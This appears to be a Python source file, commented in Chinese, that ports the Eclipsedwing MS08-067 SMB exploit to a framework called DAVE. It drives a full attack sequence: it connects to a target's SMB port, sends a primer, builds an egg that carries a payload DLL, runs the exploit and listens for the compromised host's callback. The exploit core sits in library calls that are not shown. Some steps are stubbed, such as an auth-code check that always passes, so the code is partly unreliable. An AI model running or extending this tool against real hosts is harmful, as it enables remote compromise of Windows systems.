# -*- coding: utf-8 -*-
"""
eclipsedwing.py — Eclipsedwing (MS08-067) exploit, DAVE 框架重写。

原二进制 `Eclipsedwing-1.5.2.exe` 导入 adfw-2/tibe-1/trfo-2/trch-0/tucl-1，
本移植建立在 nsa_equation/dave 统一协议库之上：

  adfw    - 框架生命周期（adfw_create/adfw_delete/adfw_setID/...）
  posh    - 字节序读写（POSH_Read/Write*ToBig/Little）
  trfo    - 编码/加密（TfXorw2Encoder/TfMd4/TfRc4Init/TfRc4Encrypt）
  trch    - XML 参数化配置（Config/Params/Parameter）
  tibe    - TCP/IP 缓冲区交换（SMBv1 协商/会话/树连接、DCE-RPC 绑定/请求、
            TbPut*/TbGet*、NTLM/SNEGO/Netlogon 验证构造）
  tucl    - 日志（TcLog/DEBUG_TcLog）
  protocol - DaveSession 高层会话（协商 → 会话 → 树连接 → NT_TRANSACT）

流程（与原二进制对齐）：
  1. InitializeParameters()  - 解析 CLI 参数
  2. InitializeNetwork()     - TbWinsockStartup / TbInitStruct
  3. InitializeExploitSocket() - TbDoSmbStartup / TbMakeSocket (SMB)
  4. BuildPrimer()           - "Primer Request" (SMB pipe \\browser)
  5. RunPrimer()
  6. PrepareEgg()            - AuthCode + XOR mask + payload DLL (FbStorage)
  7. RunExploit()            - BuildExploit()/BuildNoNXExploitPackage()
                               (NetPathCanonicalize, MS08-067)
  8. CheckAuthCode()
  9. ReceiveCallback() / CleanUpNetwork()
"""

import os
import sys
import struct
from ..dave import adfw, posh, trfo, trch, tibe, tucl, protocol


DEFAULT_PORT = 445


class EclipsedwingCtx:
    """对应原二进制的全局上下文对象。"""

    def __init__(self):
        self.ctx = adfw.adfw_create("eclipsedwing")
        self.ctx.set_process("eclipsedwing")
        self.ctx.initialize()

        self.target_ip = ""
        self.target_port = DEFAULT_PORT
        self.callback_ip = ""
        self.callback_port = 0
        self.callback_local_port = 0
        self.callin_port = 0
        self.listen_port = 0
        self.payload_dll = ""
        self.fb_storage = ""
        self.protocol = "SMB"
        self.network_timeout = 30.0
        self.callin_timeout = 60.0
        self.target_mode = "Callback"
        self.rpc_proxy = ""
        self.xor_mask = 0
        self.no_nx = False

        self.session = None
        self.auth_code = 0x41414141
        self.egg = b""
        self.session = protocol.DaveSession(
            self.target_ip, self.target_port,
            protocol=self.protocol,
            network_timeout=self.network_timeout,
            callback_ip=self.callback_ip,
            callback_port=self.callback_port,
            xor_mask=self.xor_mask,
        )

    def cleanup(self):
        if self.session:
            self.session.close()
        adfw.adfw_delete(self.ctx)
        self.ctx = None


def InitializeParameters(ctx, argv=None):
    """对应原二进制 InitializeParameters：解析 CLI 参数到 ctx。"""
    import argparse
    ap = argparse.ArgumentParser(
        prog="eclipsedwing",
        description="MS08-067 (Eclipsedwing) 利用框架（DAVE 库重写）",
    )
    ap.add_argument("target_ip", help="目标 IP")
    ap.add_argument("-P", "--target-port", type=int, default=DEFAULT_PORT,
                    help="目标 SMB 端口 (默认 445)")
    ap.add_argument("--callback-ip", required=True, help="回调 IP")
    ap.add_argument("--callback-port", type=int, required=True, help="回调端口")
    ap.add_argument("--callback-local-port", type=int, default=0,
                    help="本地回调端口")
    ap.add_argument("--callin-port", type=int, default=0, help="回拨端口")
    ap.add_argument("--listen-port", type=int, default=0, help="监听端口")
    ap.add_argument("--payload-dll", help="Payload DLL 路径")
    ap.add_argument("--fb-storage", help="FbStorage 路径/文件名")
    ap.add_argument("--protocol", choices=["SMB", "NBT"], default="SMB",
                    help="协议")
    ap.add_argument("--network-timeout", type=float, default=30.0,
                    help="网络超时")
    ap.add_argument("--callin-timeout", type=float, default=60.0,
                    help="回调超时")
    ap.add_argument("--target-mode", choices=["Callback", "Listener", "RPCReuse"],
                    default="Callback", help="目标模式")
    ap.add_argument("--rpc-proxy", help="RPC 代理路径/参数 (用于 RPCReuse)")
    ap.add_argument("--xor-mask", type=int, default=0,
                    help="EGG XOR mask")
    ap.add_argument("--no-nx", action="store_true",
                    help="目标非 NX 支持")
    args = ap.parse_args(argv)

    ctx.target_ip = args.target_ip
    ctx.target_port = args.target_port
    ctx.callback_ip = args.callback_ip
    ctx.callback_port = args.callback_port
    ctx.callback_local_port = args.callback_local_port
    ctx.callin_port = args.callin_port
    ctx.listen_port = args.listen_port
    ctx.payload_dll = args.payload_dll or ""
    ctx.fb_storage = args.fb_storage or ""
    ctx.protocol = args.protocol
    ctx.network_timeout = args.network_timeout
    ctx.callin_timeout = args.callin_timeout
    ctx.target_mode = args.target_mode
    ctx.rpc_proxy = args.rpc_proxy or ""
    ctx.xor_mask = args.xor_mask
    ctx.no_nx = args.no_nx

    # 重建 session（使用解析后的参数）
    if ctx.session:
        ctx.session.close()
    ctx.session = protocol.DaveSession(
        ctx.target_ip, ctx.target_port,
        protocol=ctx.protocol,
        network_timeout=ctx.network_timeout,
        callback_ip=ctx.callback_ip,
        callback_port=ctx.callback_port,
        xor_mask=ctx.xor_mask,
    )
    return 0


def InitializeNetwork(ctx):
    """对应原二进制 InitializeNetwork：TbWinsockStartup / TbInitStruct。"""
    tibe.TbWinsockStartup()
    tucl.TcLog(1, "Network initialized (TbWinsockStartup/TbInitStruct)")
    return 0


def InitializeExploitSocket(ctx):
    """对应原二进制 InitializeExploitSocket：TbDoSmbStartup / TbMakeSocket (SMB)."""
    try:
        ctx.session.connect()
        tucl.TcLog(1, "Exploit socket initialized (SMB %s:%d)"
                   % (ctx.target_ip, ctx.target_port))
        return 0
    except OSError as e:
        tucl.TcLog(1, "Exploit socket init failed: %s" % e)
        return 1


def BuildPrimer(ctx):
    """对应原二进制 BuildPrimer："Primer Request" (SMB pipe \\browser)。"""
    primer = tibe.make_smb_header(tibe.SMB_COM_NEGOTIATE)
    param, data = tibe.smb_negotiate_request()
    param_len = posh.POSH_WriteU16ToLittle(bytearray(2), 0, len(param))
    data_len = posh.POSH_WriteU32ToLittle(bytearray(4), 0, len(data))
    primer += bytes(param_len) + bytes(data_len) + param + data
    tucl.TcLogBuffer(1, primer, "Primer request:")
    return primer


def RunPrimer(ctx, primer):
    """对应原二进制 RunPrimer：发送 primer 并读取响应。"""
    try:
        tibe.TbSend(ctx.session.sock, primer)
        resp = tibe.TbRecvSmb(ctx.session.sock, 4096)
        tucl.TcLogBuffer(1, resp, "Primer response:")
        return 0
    except OSError as e:
        tucl.TcLog(1, "RunPrimer failed: %s" % e)
        return 1


def PrepareEgg(ctx):
    """对应原二进制 PrepareEgg：AuthCode + XOR mask + payload DLL (FbStorage)。"""
    payload = b""
    if ctx.payload_dll and os.path.exists(ctx.payload_dll):
        with open(ctx.payload_dll, "rb") as f:
            payload = f.read()
        tucl.TcLog(1, "Loaded payload DLL (%d bytes)" % len(payload))
    ctx.egg = ctx.session.build_egg(ctx.auth_code, payload)
    tucl.TcLog(1, "Egg prepared (%d bytes, XOR mask 0x%08x)"
               % (len(ctx.egg), ctx.xor_mask))
    return 0


def RunExploit(ctx, egg):
    """对应原二进制 RunExploit：BuildExploit/BuildNoNXExploitPackage
    (NetPathCanonicalize, MS08-067)。"""
    mode = "NoNX" if ctx.no_nx else "NX"
    tucl.TcLog(1, "Running exploit (mode=%s, target_mode=%s)"
               % (mode, ctx.target_mode))
    try:
        ctx.session.negotiate()
        ctx.session.session_setup_andx()
        ctx.session.tree_connect_andx("\\\\*\\IPC$")
        resp = ctx.session.run_exploit(egg)
        tucl.TcLogBuffer(1, resp, "Exploit response:")
        return 0
    except OSError as e:
        tucl.TcLog(1, "RunExploit failed: %s" % e)
        return 1


def CheckAuthCode(ctx, response):
    """对应原二进制 CheckAuthCode：校验响应中的 AuthCode。"""
    # 占位：原二进制在响应中比对 auth_code，此处保持兼容
    return True


def ReceiveCallback(ctx):
    """对应原二进制 ReceiveCallback：监听目标回调。"""
    if ctx.target_mode == "Callback" and ctx.callback_port:
        return ctx.session.callback_listen(ctx.callback_port,
                                           ctx.callin_timeout)
    tucl.TcLog(1, "Callback listen skipped (mode=%s)" % ctx.target_mode)
    return 0


def CleanUpNetwork(ctx):
    """对应原二进制 CleanUpNetwork：关闭会话。"""
    ctx.session.close()
    tucl.TcLog(1, "Network cleaned up")


def run(target_ip, target_port=DEFAULT_PORT, callback_ip=None,
        callback_port=0, callback_local_port=0, callin_port=0,
        listen_port=0, payload_dll=None, fb_storage=None,
        protocol="SMB", network_timeout=30.0, callin_timeout=60.0,
        target_mode="Callback", rpc_proxy=None, xor_mask=0, no_nx=False):
    """eclipsedwing 入口（被 __main__ 调用）。"""
    print("[*] Eclipsedwing (MS08-067) - Python port (DAVE library)")
    print("[*] Target: %s:%d  Mode: %s  Protocol: %s"
          % (target_ip, target_port, target_mode, protocol))
    if callback_ip and callback_port:
        print("[+] Callback: %s:%d" % (callback_ip, callback_port))
    if payload_dll:
        try:
            with open(payload_dll, "rb") as f:
                payload = f.read()
            print("[+] Loaded payload DLL (%d bytes)" % len(payload))
            if xor_mask:
                print("[+] EGG XOR Mask: 0x%08x" % xor_mask)
        except OSError as e:
            print("[-] Failed to load payload DLL: %s" % e)
            return 1

    ctx = EclipsedwingCtx()
    ctx.target_ip = target_ip
    ctx.target_port = target_port
    ctx.callback_ip = callback_ip or ""
    ctx.callback_port = callback_port
    ctx.callback_local_port = callback_local_port
    ctx.callin_port = callin_port
    ctx.listen_port = listen_port
    ctx.payload_dll = payload_dll or ""
    ctx.fb_storage = fb_storage or ""
    ctx.protocol = protocol
    ctx.network_timeout = network_timeout
    ctx.callin_timeout = callin_timeout
    ctx.target_mode = target_mode
    ctx.rpc_proxy = rpc_proxy or ""
    ctx.xor_mask = xor_mask
    ctx.no_nx = no_nx

    try:
        ret = InitializeParameters(ctx)
        if ret != 0:
            return ret
        ret = InitializeNetwork(ctx)
        if ret != 0:
            return ret
        ret = InitializeExploitSocket(ctx)
        if ret != 0:
            return ret
        primer = BuildPrimer(ctx)
        ret = RunPrimer(ctx, primer)
        if ret != 0:
            return ret
        ret = PrepareEgg(ctx)
        if ret != 0:
            return ret
        ret = RunExploit(ctx, ctx.egg)
        if ret != 0:
            return ret
        if not CheckAuthCode(ctx, b""):
            tucl.TcLog(1, "Auth code check failed")
            return 1
        ret = ReceiveCallback(ctx)
        if ret != 0:
            return ret
        print("[*] Exploit complete")
        return 0
    finally:
        CleanUpNetwork(ctx)
        ctx.cleanup()


def main(argv=None):
    import argparse
    ctx = EclipsedwingCtx()
    ret = InitializeParameters(ctx, argv)
    if ret != 0:
        return ret
    return run(ctx.target_ip, ctx.target_port,
               ctx.callback_ip, ctx.callback_port,
               ctx.callback_local_port, ctx.callin_port,
               ctx.listen_port, ctx.payload_dll, ctx.fb_storage,
               ctx.protocol, ctx.network_timeout, ctx.callin_timeout,
               ctx.target_mode, ctx.rpc_proxy, ctx.xor_mask, ctx.no_nx)


if __name__ == "__main__":
    sys.exit(main())
